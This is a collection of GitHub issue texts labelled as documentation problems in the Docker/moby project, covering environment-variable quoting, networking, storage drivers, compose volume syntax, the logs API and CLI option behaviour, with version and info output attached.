[\r\n\t\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\r\n\t\"DQUOTE=One two two three four\",\r\n\t\"SQUOTE=One two two three four\",\r\n\t\"SBACKSLASH=One two two three four\",\r\n\t\"DBACKSLASH=One two\\\\ two three four\",\r\n\t\"BACKTICK=One `two two` three four\"\r\n],\r\n```\r\n\r\n**Describe the results you expected:**\r\n\r\n```\r\n\"Env\": [\r\n\t\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\r\n\t\"DQUOTE=One \\\"two two\\\" three four\",\r\n\t\"SQUOTE=One 'two two' three four\",\r\n\t\"SBACKSLASH=One two\\\\ two three four\",\r\n\t\"DBACKSLASH=One two\\\\\\\\ two three four\",\r\n\t\"BACKTICK=One `two two` three four\"\r\n],\r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\nIn the hope that it's useful, I created a test `Dockerfile` for reproduction in this repo:\r\n\r\n* https://github.com/gentlemanautomaton/docker-env-quote-test\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:       18.01.0-ce\r\n API version:   1.35\r\n Go version:    go1.9.2\r\n Git commit:    03596f5\r\n Built: Wed Jan 10 20:13:21 2018\r\n OS/Arch:       linux/amd64\r\n Experimental:  false\r\n Orchestrator:  swarm\r\n\r\nServer:\r\n Engine:\r\n  Version:      18.01.0-ce\r\n  API version:  1.35 (minimum version 1.12)\r\n  Go version:   go1.9.2\r\n  Git commit:   03596f5\r\n  Built:        Wed Jan 10 20:11:47 2018\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 0\r\n Paused: 0\r\n Stopped: 3\r\nImages: 361\r\nServer Version: 18.01.0-ce\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 89623f28b87a6004d4b785663257362d1658a729\r\nrunc version: b2567b37d7b75eb4cf325b77297b140ea686ce8f\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.13.0-25-generic\r\nOperating System: Ubuntu 17.10\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 16\r\nTotal Memory: 31.47GiB\r\nName: REDACTED\r\nID: SVWR:PGRT:4NZT:KVIT:DVBE:EKDI:GG2T:46U2:5PEW:X4UL:LGQZ:SEL4\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nLabels:\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nThe test was performed with `docker-ce` running on physical hardware."},{"labels":["documentation",null],"text":"Just a heads up that the examples over here - https://docs.docker.com/engine/reference/commandline/inspect/#extended-description are incorrect if an overlay network is used.  The Go template extracts 2 IPs in this case (one from the ingress layer and the second the one used by the container) and concatenates them.  Here is an example:\r\n\r\n```\r\n$ docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' container1\r\n10.255.0.2110.0.1.9\r\n```\r\n\r\nThe above is on Docker 17.12\r\n\r\n```\r\n$ docker version\r\nClient:\r\n Version:       17.12.0-ce-rc2\r\n API version:   1.35\r\n Go version:    go1.9.2\r\n Git commit:    f9cde63\r\n Built: Tue Dec 12 06:38:26 2017\r\n OS/Arch:       linux/amd64\r\n\r\nServer:\r\n Engine:\r\n  Version:      17.12.0-ce-rc2\r\n  API version:  1.35 (minimum version 1.12)\r\n  Go version:   go1.9.2\r\n  Git commit:   f9cde63\r\n  Built:        Tue Dec 12 06:45:30 2017\r\n  OS/Arch:      linux/amd64\r\n  Experimental: false\r\n```"},{"labels":[null,"documentation"],"text":"**Description**\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\nThe link for `docker stack config` listed under \"Related commands\" at the end of page under URL -\r\n https://github.com/docker/cli/blob/master/docs/reference/commandline/deploy.md returns 404 page error.\r\n\r\n**Steps to reproduce the issue:**\r\n1. Go to https://github.com/docker/cli/blob/master/docs/reference/commandline/deploy.md\r\n2. Scroll to the end of the page section \"Related Commands\"\r\n3. Click on the first link - https://github.com/docker/cli/blob/master/docs/reference/commandline/stack_config.md\r\n4. It shows 404 page not found error\r\n\r\n**Describe the results you received:**\r\n\r\nThe page reports 404 error \r\n\r\n**Describe the results you expected:**\r\n\r\nThe page should display reference to `docker stack config` command.\r\n"},{"labels":[null,"documentation",null,null],"text":"**Description**\r\n\r\nDevicemapper fails on bonnie++ test when using >4Gb / >8Gb files (bonnie uses disk=2*RAM)\r\n\r\n**Steps to reproduce the issue:**\r\n1. Configure docker to use devicemapper (no care loop or thinpool)\r\n2. Run `docker run -ti ariarijp/bonnie -d /tmp -u root`\r\n\r\n**Describe the results you received:**\r\n```\r\nUsing uid:0, gid:0.\r\nWriting a byte at a time...done\r\nWriting intelligently...Can't write block.: No such file or directory\r\nCan't write block 1277407.\r\n```\r\n\r\n**Describe the results you expected:**\r\n_Test results._\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\nOverlay, overlay2, aufs, btrfs, zfs, vfs, host direcory works. devicemapper - not.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.09.0-ce\r\n API version:  1.32\r\n Go version:   go1.8.3\r\n Git commit:   afdb6d4\r\n Built:        Tue Sep 26 22:42:18 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.09.0-ce\r\n API version:  1.32 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   afdb6d4\r\n Built:        Tue Sep 26 22:40:56 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 16\r\n Running: 1\r\n Paused: 0\r\n Stopped: 15\r\nImages: 1\r\nServer Version: 17.09.0-ce\r\nStorage Driver: devicemapper\r\n Pool Name: docker-thinpool\r\n Pool Blocksize: 524.3kB\r\n Base Device Size: 10.74GB\r\n Backing Filesystem: xfs\r\n Data file:\r\n Metadata file:\r\n Data Space Used: 91.11GB\r\n Data Space Total: 130.6GB\r\n Data Space Available: 39.45GB\r\n Metadata Space Used: 6.033MB\r\n Metadata Space Total: 1.372GB\r\n Metadata Space Available: 1.366GB\r\n Thin Pool Minimum Free Space: 13.06GB\r\n Udev Sync Supported: true\r\n Deferred Removal Enabled: true\r\n Deferred Deletion Enabled: true\r\n Deferred Deleted Device Count: 0\r\n Library Version: 1.02.110 (2015-10-30)\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 06b9cb35161009dcb7123345749fef02f7cea8e0\r\nrunc version: 3f2f8b84a77f73d38244dd690525642a72156c64\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-97-generic\r\nOperating System: Ubuntu 16.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 4\r\nTotal Memory: 15.67GiB\r\nName: loadtest\r\nID: N6HT:CHLJ:545Y:NGOT:HGXV:NK7W:ZEP3:DZWG:CH5N:D2TV:OKLR:F5LV\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nVM in VMware ESXi, 5.5.0, 2068190\r\n\r\n_/etc/docker/daemon.json_\r\n```\r\n{\r\n  \"storage-driver\": \"devicemapper\",\r\n  \"storage-opts\": [\r\n    \"dm.directlvm_device=/dev/sdb\"\r\n  ]\r\n}\r\n```\r\n\r\n_Dockerfile_\r\n```\r\nFROM ubuntu:14.04\r\nMAINTAINER Takuya Arita <takuya.arita@gmail.com>\r\n\r\n# Install Dependencies\r\nRUN apt-get update && apt-get install -y bonnie++\r\n\r\n# Run bonnie++\r\nENTRYPOINT [\"bonnie++\"]\r\n```\r\n\r\n**Another attempts**\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -d /tmp -u root` **works** 4Gb RAM 8Gb files\r\n`docker run -ti --memory=5G ariarijp/bonnie -r 5120 -d /tmp -u root` **not works** 5Gb RAM 10GB files\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -s 9977 -d /tmp -u root` **works** 4Gb RAM 9977Mb files\r\n`docker run -ti --memory=4G ariarijp/bonnie -r 4096 -s 9978 -d /tmp -u root` **not works** 4Gb RAM 9978Mb files (it varies +- megabyte)"},{"labels":[null,"documentation"],"text":"In https://github.com/moby/moby/pull/6909 the change was made that, if one specifies an ENTRYPOINT and the base image contains a CMD, then the CMD will be emptied.\r\n\r\nThis behavior is nowhere documented. (Neither in the Dockerfile Reference nor Best Practices)\r\n\r\nFor me this behavior was quite unexpected, because the ENTRYPOINT seems to be the point where one can push in start up scripts. For example nginx images specify a CMD (without ENTRYPOINT) to start the nginx. In my inheriting image I use an ENTRYPOINT script to do some environment dependant configuration and then want to do `exec \"$@\"` to \"resume\" with the base image's CMD. That does not work and I need to respecify the CMD (= copy over and maintain) from the nginx base image.\r\n\r\nThis behavior needs to be documented. From my point of view it could even be changed back, but I certainly miss the creators intented purpose of ENTRYPOINT."},{"labels":["documentation",null,null],"text":"**Description**\r\nI configure the `/etc/docker/daemon.json` with the \"mtu\" parameter to 1450.\r\nDefault bridge is ok with mtu=1450.\r\nBut when a new bridge network is created (either `docker network create `or `docker-compose`), the mtu parameter is false. It's always 1500.\r\n\r\n\r\n**Steps to reproduce the issue:**\r\n1. Add `\"mtu\": 1450 `to `/etc/docker/daemon.json`\r\n2. Restart docker daemon\r\n3. Create a new bridge : `docker network create my-net`\r\n\r\n**Describe the results you received:**\r\nmy-net MTU = 1500 \r\n\r\n**Describe the results you expected:**\r\nmy-net MTU = 1450\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.2-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   cec0b72\r\n Built:        Tue Sep  5 20:00:17 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.2-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   cec0b72\r\n Built:        Tue Sep  5 19:59:11 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 1\r\n Paused: 0\r\n Stopped: 3\r\nImages: 41\r\nServer Version: 17.06.2-ce\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/100000.100000/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 163\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 6e23458c129b551d5c9871e5174f6b1b7f6d1170\r\nrunc version: 810190ceaa507aa2727d7ae6f4790c76ec150bd2\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\n userns\r\nKernel Version: 4.4.0-93-generic\r\nOperating System: Ubuntu 16.04.3 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 15.67GiB\r\nName: test-vm-04\r\nID: OZSP:AWLJ:HAPO:CZD6:NNLX:YDIT:LGWR:RMEI:P4SK:SBY4:2RAT:5YIK\r\nDocker Root Dir: /var/lib/docker/100000.100000\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: true\r\n```\r\n"},{"labels":["documentation",null,null],"text":"Hi!\r\n\r\nShould the --update-monitor be greater than --stop-grace-period to monitorize the update process?\r\n\r\nI mean, does --update-monitor time start counting while task is shutting down or it starts to count when the new task is starting?\r\n\r\nThanks!"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nLooks like documentation for docker network is outdated.\r\nTrying to learn docker network using the examples provided [here](https://docs.docker.com/engine/userguide/networking/work-with-networks/#link-containers-without-using-user-defined-networks).\r\n\r\n**Steps to reproduce the issue:**\r\n1.create docker network \r\n    `$ docker network create -o \"com.docker.network.bridge.host_binding_ipv4\"=\"172.23.0.1\" my-network`\r\n    bf64e40499c8c1644c8ed3b743f25dc72866ae81294cec92d86e216fbb9a0ab5\r\n\r\n2. inspect the network.\r\n\r\n    `$ docker network inspect my-network`\r\n\r\n```\r\n[\r\n    {\r\n        \"Name\": \"my-network\",\r\n        \"Id\": \"bf64e40499c8c1644c8ed3b743f25dc72866ae81294cec92d86e216fbb9a0ab5\",\r\n        \"Created\": \"2017-09-16T23:48:31.063263608-04:00\",\r\n        \"Scope\": \"local\",\r\n        \"Driver\": \"bridge\",\r\n        \"EnableIPv6\": false,\r\n        \"IPAM\": {\r\n            \"Driver\": \"default\",\r\n            \"Options\": {},\r\n            \"Config\": [\r\n                {\r\n                    \"Subnet\": \"172.18.0.0/16\",\r\n                    \"Gateway\": \"172.18.0.1\"\r\n                }\r\n            ]\r\n        },\r\n        \"Internal\": false,\r\n        \"Attachable\": false,\r\n        \"Ingress\": false,\r\n        \"ConfigFrom\": {\r\n            \"Network\": \"\"\r\n        },\r\n        \"ConfigOnly\": false,\r\n        \"Containers\": {},\r\n        \"Options\": {\r\n            \"com.docker.network.bridge.host_binding_ipv4\": \"172.23.0.1\"\r\n        },\r\n        \"Labels\": {}\r\n    }\r\n]\r\n```\r\n\r\n3. run redis in this network\r\n\r\n    `$ docker run -d -P --name redis --network my-network redis`\r\n\r\n```\r\nUnable to find image 'redis:latest' locally\r\nlatest: Pulling from library/redis\r\n065132d9f705: Pull complete \r\nfc32c7d9b0f4: Pull complete \r\nad60cc6fa431: Pull complete \r\nb21c99d8cf03: Pull complete \r\n357908014789: Pull complete \r\ne27e1cb0ca43: Pull complete \r\nDigest: sha256:fe77356e6e8d5c5200b9800e50ae71147efdc446a3cc4f601c607fbfd218015e\r\nStatus: Downloaded newer image for redis:latest\r\nf103a6542e50ecd5bb257b9c68214537f1392069d94ddfbf19416af3e54cc640\r\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint redis (1339918305c70f9e6416a5d499b5f6b8691450c9a3d310c8f7c3495c34a931ee): Error starting userland proxy: listen tcp 172.23.0.1:32777: bind: cannot assign requested address.\r\n```\r\n\r\n\r\n\r\n**Describe the results you received:**\r\n\r\ndocker should be able to run redis successfully in provided network.\r\n\r\n**Describe the results you expected:**\r\n\r\n```\r\ndocker: Error response from daemon: driver failed programming external connectivity on endpoint redis (1339918305c70f9e6416a5d499b5f6b8691450c9a3d310c8f7c3495c34a931ee): Error starting userland proxy: listen tcp 172.23.0.1:32777: bind: cannot assign requested address.\r\n```\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.09.0-ce-rc1\r\n API version:  1.31\r\n Go version:   go1.8.3\r\n Git commit:   ae21824\r\n Built:        Wed Sep  6 22:31:42 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.09.0-ce-rc1\r\n API version:  1.32 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   ae21824\r\n Built:        Wed Sep  6 22:33:07 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 4\r\n Running: 0\r\n Paused: 0\r\n Stopped: 4\r\nImages: 21\r\nServer Version: 17.09.0-ce-rc1\r\nStorage Driver: overlay2\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\n Native Overlay Diff: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 06b9cb35161009dcb7123345749fef02f7cea8e0\r\nrunc version: 3f2f8b84a77f73d38244dd690525642a72156c64\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.12.9-300.fc26.x86_64\r\nOperating System: Fedora 26 (Twenty Six)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 2\r\nTotal Memory: 7.794GiB\r\nName: localhost.localdomain\r\nID: R3ET:HF5C:ILYK:S46A:5OYO:E67Z:GACB:AFJE:5V7G:EY3V:GBMX:IPTB\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\nPhysical - Fedora 26"},{"labels":["documentation",null],"text":"**Description**\r\n\r\nThe docker compose documentation shows an example of Volume long syntax as below\r\n\r\n```yaml\r\nversion: \"3.2\"\r\nservices:\r\n  web:\r\n    image: nginx:alpine\r\n    ports:\r\n      - \"80:80\"\r\n\r\nnetworks:\r\n  webnet:\r\n\r\nvolumes:\r\n  - type: volume\r\n    source: mydata\r\n    target: /data\r\n    volume:\r\n      nocopy: true\r\n  - type: bind\r\n    source: ./static\r\n    target: /opt/app/static\r\n```\r\n> Note: The long syntax is new in v3.2\r\n\r\nI believe this format is only valid for volumes property of the service. Please correct me that is not the case \r\n\r\n**Steps to reproduce the issue:**\r\n$ docker-compose config\r\nERROR: In file './docker-compose.yml', volume must be a mapping, not an array.\r\n\r\n**Describe the results you received:**\r\nERROR: In file './docker-compose.yml', volume must be a mapping, not an array.\r\n\r\n\r\n**Describe the results you expected:**\r\nDocumentation examples should work\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:23:31 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:19:04 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nClient:\r\n Version:      17.06.0-ce\r\n API version:  1.30\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:23:31 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.06.0-ce\r\n API version:  1.30 (minimum version 1.12)\r\n Go version:   go1.8.3\r\n Git commit:   02c1d87\r\n Built:        Fri Jun 23 21:19:04 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\nvagrant@vagrant:~/so/volumes$ docker info\r\nContainers: 44\r\n Running: 5\r\n Paused: 0\r\n Stopped: 39\r\nImages: 92\r\nServer Version: 17.06.0-ce\r\nStorage Driver: aufs\r\n Root Dir: /var/lib/docker/aufs\r\n Backing Filesystem: extfs\r\n Dirs: 355\r\n Dirperm1 Supported: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins:\r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\n Log: awslogs fluentd gcplogs gelf journald json-file logentries splunk syslog\r\nSwarm: active\r\n NodeID: smh2288801wg3b15f0twxaew1\r\n Is Manager: true\r\n ClusterID: 3pqs1zxfxe76sb3r462engtfa\r\n Managers: 1\r\n Nodes: 1\r\n Orchestration:\r\n  Task History Retention Limit: 5\r\n Raft:\r\n  Snapshot Interval: 10000\r\n  Number of Old Snapshots to Retain: 0\r\n  Heartbeat Tick: 1\r\n  Election Tick: 3\r\n Dispatcher:\r\n  Heartbeat Period: 5 seconds\r\n CA Configuration:\r\n  Expiry Duration: 3 months\r\n  Force Rotate: 0\r\n Root Rotation In Progress: false\r\n Node Address: 192.168.33.100\r\n Manager Addresses:\r\n  192.168.33.100:2377\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: cfb82a876ecc11b5ca0977d1733adbe58599088a\r\nrunc version: 2d41c047c83e09a6d61d464906feb2a2f3c52aa4\r\ninit version: 949e6fa\r\nSecurity Options:\r\n apparmor\r\n seccomp\r\n  Profile: default\r\nKernel Version: 4.4.0-66-generic\r\nOperating System: Ubuntu 16.04.2 LTS\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 1\r\nTotal Memory: 992.3MiB\r\nName: vagrant\r\nID: H5PY:YSAS:TWDZ:HRHQ:7WPR:GAOZ:5PNY:YZTD:UB2K:QDDD:DVY5:OJF3\r\nDocker Root Dir: /var/lib/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nUsername: tarunlalwani\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n\r\nWARNING: No swap limit support\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\n\r\n```\r\n$ docker-compose --version\r\ndocker-compose version 1.15.0, build e12f3b9\r\n```"},{"labels":["documentation",null,null],"text":"<!--\r\nIf you are reporting a new issue, make sure that we do not have any duplicates\r\nalready open. You can ensure this by searching the issue list for this\r\nrepository. If there is a duplicate, please close your issue and add a comment\r\nto the existing issue instead.\r\n\r\nIf you suspect your issue is a bug, please edit your issue description to\r\ninclude the BUG REPORT INFORMATION shown below. If you fail to provide this\r\ninformation within 7 days, we cannot debug your issue and will close it. We\r\nwill, however, reopen it if you later provide the information.\r\n\r\nFor more information about reporting issues, see\r\nhttps://github.com/docker/docker/blob/master/CONTRIBUTING.md#reporting-other-issues\r\n\r\n---------------------------------------------------\r\nGENERAL SUPPORT INFORMATION\r\n---------------------------------------------------\r\n\r\nThe GitHub issue tracker is for bug reports and feature requests.\r\nGeneral support can be found at the following locations:\r\n\r\n- Docker Support Forums - https://forums.docker.com\r\n- IRC - irc.freenode.net #docker channel\r\n- Post a question on StackOverflow, using the Docker tag\r\n\r\n---------------------------------------------------\r\nBUG REPORT INFORMATION\r\n---------------------------------------------------\r\nUse the commands below to provide key information from your environment:\r\nYou do NOT have to include this information if this is a FEATURE REQUEST\r\n-->\r\n\r\n**Description**\r\nFollowing the documentation on using [binded volumes](https://docs.docker.com/engine/admin/volumes/bind-mounts/#start-a-container-with-a-bind-mount), using --mount instead of -v does not allow / in the source path and gives me the error: \r\n```\r\ndocker: Error response from daemon: create /home/martinmine/Documents/target: \"/home/martinmine/Documents/target\" includes invalid characters for a local volume name, only \"[a-zA-Z0-9][a-zA-Z0-9_.-]\" are allowed. If you intended to pass a host directory, use absolute path.\r\nSee 'docker run --help'.\r\n```\r\nRunning  `docker run -d -it --name devtest -v $(pwd)/target:/app nginx:latest` works fine and mounts the `target` directory just find. However, running `docker run -d -it --name devtest --mount source=$(pwd)/target,target=/app nginx:latest` gives me the error above.\r\n\r\n\r\n<!--\r\nBriefly describe the problem you are having in a few paragraphs.\r\n-->\r\n\r\n**Steps to reproduce the issue:**\r\n1. `mkdir target`\r\n2. `docker run -d -it --name devtest --mount source=$(pwd)/target,target=/app nginx:lates`\r\n\r\n**Describe the results you received:**\r\n\r\nSee error message above.\r\n\r\n**Describe the results you expected:**\r\n\r\nI expect the same behavior as with the -v option, [as the documentation states](https://docs.docker.com/engine/admin/volumes/bind-mounts/#start-a-container-with-a-bind-mount).\r\n\r\n**Additional information you deem important (e.g. issue happens only occasionally):**\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nDocker version 17.05.0-ce, build 89658be\r\n```\r\n\r\n**Output of `docker info`:**\r\n\r\n```\r\nContainers: 3\r\n Running: 3\r\n Paused: 0\r\n Stopped: 0\r\nImages: 22\r\nServer Version: 17.05.0-ce\r\nStorage Driver: overlay\r\n Backing Filesystem: extfs\r\n Supports d_type: true\r\nLogging Driver: json-file\r\nCgroup Driver: cgroupfs\r\nPlugins: \r\n Volume: local\r\n Network: bridge host macvlan null overlay\r\nSwarm: inactive\r\nRuntimes: runc\r\nDefault Runtime: runc\r\nInit Binary: docker-init\r\ncontainerd version: 9048e5e50717ea4497b757314bad98ea3763c145\r\nrunc version: 9c2d8d184e5da67c95d601382adf14862e4f2228\r\ninit version: 949e6fa\r\nSecurity Options:\r\n seccomp\r\n  Profile: default\r\nKernel Version: 3.10.0-514.10.2.el7.x86_64\r\nOperating System: CentOS Linux 7 (Core)\r\nOSType: linux\r\nArchitecture: x86_64\r\nCPUs: 16\r\nTotal Memory: 28.6GiB\r\nName: xxxxxxxxxxx\r\nID: 6OYY:KN5X:OBD3:SOUB:7CXB:5RL4:XUOZ:7ZEJ:CIOB:U6ZZ:PLYF:6P2X\r\nDocker Root Dir: /mnt/docker\r\nDebug Mode (client): false\r\nDebug Mode (server): false\r\nRegistry: https://index.docker.io/v1/\r\nExperimental: false\r\nInsecure Registries:\r\n 127.0.0.0/8\r\nLive Restore Enabled: false\r\n```\r\n\r\n**Additional environment details (AWS, VirtualBox, physical, etc.):**\r\nHappens on both a virtual machine through Openstack (CentOS7), and on my laptop (Fedora)."},{"labels":[null,"documentation",null,null],"text":"Hi !\r\n\r\nI'm writing a tool (in Python) to get the logs from any containers through the Docker Engine's HTTP API.\r\n\r\nAfter reading [the doc](https://docs.docker.com/engine/api/v1.30/), and trying to implement something, I founded that the protocol used seems to be different from the one for Attach, it seems to be :\r\n\r\n```{\\xFF}\\r\\n{\\xFF}{datas}```\r\n\r\nWhere the first hex number is the size of the message, and the second one seems to be (empirical deduction) the number of bytes that are supposed to be ignored before the start of the actual payload (so the log).\r\nAnd it seems to work, for some containers at least ...\r\n\r\n**EDIT** : The second seems to be the number of bytes that are supposed to be ignored IF the container has ```tty: false```, otherwise, it seems to be the start of the log **END of the edit**\r\n\r\nWith one strange deduction : if ```\\x07``` is found, then it overrides the second {\\xFF} size, and the message starts after this value...\r\n\r\nAm I missing a part of the documentation, or am I not using the HTTP API in a wrong way ?\r\n\r\nThanks for your time,\r\n\r\n**NB** : The protocol above seems to be specific for the logs endpoint, it's not working for the events' endpoint.\r\n\r\n**Output of `docker version`:**\r\n\r\n```\r\nClient:\r\n Version:      17.05.0-ce\r\n API version:  1.29\r\n Go version:   go1.7.5\r\n Git commit:   89658be\r\n Built:        Thu May  4 22:10:54 2017\r\n OS/Arch:      linux/amd64\r\n\r\nServer:\r\n Version:      17.05.0-ce\r\n API version:  1.29 (minimum version 1.12)\r\n Go version:   go1.7.5\r\n Git commit:   89658be\r\n Built:        Thu May  4 22:10:54 2017\r\n OS/Arch:      linux/amd64\r\n Experimental: false\r\n```\r\n\r\n"},{"labels":["documentation",null,null],"text":"This PR https://github.com/moby/moby/pull/13165 allows duration strings as `--since/--until`, but I can't find any example of `docker events --until`. From the help infomation of `docker events`, I suppose that `docker events --until 10m` will stream events for 10 minutes then stop streaming. But actually, it returns immediately without any output.\r\n\r\nAfter diging into codes, I find that the duration will be subtracted from `time.Now()`, that is to say, docker waits for -10 minutes in this scenario, that's why it returns immediately without any output. Then I try `docker events --until -10m` and it works as what I expected.\r\n\r\nMaybe it's intended behavior because @ahmetb has already answered this question in his PR:\r\n![image](https://user-images.githubusercontent.com/20569488/29160624-902086b8-7de5-11e7-959b-4514b34075f0.png)\r\n\r\nBut I still think it's confusing, `until` means do something up to some time, right?\r\n"},{"labels":[null,"documentation",null],"text":"I was looking at [`dispatchers.go`](https://github.com/moby/moby/blob/f577caff19d486d8d01443507d891cb1b0891cdc/builder/dockerfile/dispatchers.go#L689-L693) today when I realized that you can actually specify `tcp` or `udp` when you use the `EXPOSE` instruction.\r\n\r\nThis isn't mentioned at all in the [Dockerfile reference for `EXPOSE`](https://docs.docker.com/engine/reference/builder/#expose). Is this intentional?"},{"labels":["documentation",null,null],"text":"**Description**\r\n\r\nThe `docker-run` man page I'm looking at describes the `--publish-all` option as follows:\r\n\r\n> Publish all exposed ports to random ports on the host interfaces.\r\n> [...]\r\n> When using -P, Docker will bind any exposed port to a random port on the host within an ephemeral port range defined by 